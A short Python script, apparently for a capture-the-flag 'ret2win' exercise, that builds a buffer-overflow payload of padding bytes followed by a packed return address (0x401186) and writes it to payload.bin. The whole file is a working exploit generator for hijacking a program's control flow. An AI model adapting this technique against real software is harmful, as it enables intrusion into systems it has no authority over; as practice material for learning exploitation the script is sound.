import struct 

win_address = 0x401186

payload = b"A" * 10
payload += b"B" * 8
payload += struct.pack("<Q", win_address)

with open("payload.bin", "wb") as f:
    f.write(payload)

print("Payload created and saved to payload.bin")
